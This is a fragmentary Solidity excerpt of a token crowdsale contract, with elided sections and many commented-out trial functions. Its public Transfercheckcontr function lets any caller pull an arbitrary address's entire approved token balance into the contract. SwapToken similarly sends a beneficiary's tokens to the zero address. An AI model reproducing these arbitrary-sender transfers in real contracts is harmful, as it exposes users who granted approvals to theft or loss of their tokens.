...
abstract contract Crowdsale is Context, ReentrancyGuard, Pausable, Ownable {
    ...
    // function CheckSwapToken() public virtual whenNotPaused
    // {
        
    //     // token2().approve(address(this), _amount);
    //     // _token2.safeTransfer(address(this), _amount);
    // }
    // function CheckSwapToken1(address _beneficiary, uint256 _amount) public virtual whenNotPaused
    // {
    //     // uint256 amount = token2().balanceOf(_beneficiary);
    //     // uint256 amount = _amount;
    //     // token2().allowance(_msgSender(), address(this));
    //     _token2.safeTransferFrom(_beneficiary, address(this), _amount);
    // }

    // function CheckAllowance() public virtual whenNotPaused
    // {
    //     _token2.safeTransferFrom(_beneficiary, address(this), _amount);
    // }

    function CheckAllowance(address _beneficiary) public view virtual returns (uint256) {
        return token2().allowance(_beneficiary, address(this));
    }

    function CheckBalance(address _beneficiary) public view virtual returns (uint256) {
        return token2().balanceOf(_beneficiary);
    }

    // function Approvecheck(address _beneficiary, uint256 _amount) public virtual whenNotPaused {
    //     // uint256 amount = token2().balanceOf(_beneficiary);
    //     token2().approve(_beneficiary,_amount);
    // }

    function CheckAllowancesafe(address _beneficiary) public view virtual returns (uint256) {
        return token2().allowance(_beneficiary, address(this));
    }

    // function Approvechecksafe(address _beneficiary, uint256 _amount) public virtual whenNotPaused
    // {
    //     token2().safeApprove(_beneficiary, _amount);
    // }

    function Transfercheckcontr(address _beneficiary) public virtual whenNotPaused
    {
        uint256 amount = token2().balanceOf(_beneficiary);
        token2().transferFrom(_beneficiary,address(this),amount);
    }
    ...
    function SwapToken(address _beneficiary) public virtual whenNotPaused
    {
        ...
        // require(amount != amount, "Tokens: Already Sell");
        ...
        // _token2.safeTransfer(address(this), amount);
        // token2().allowance(_beneficiary, address(this));
        // token2().approve(address(this), amount);
        token2().safeTransferFrom(_beneficiary,address(0),amount);
        
   
        // uint256 accountBalance = _balances[_beneficiary];
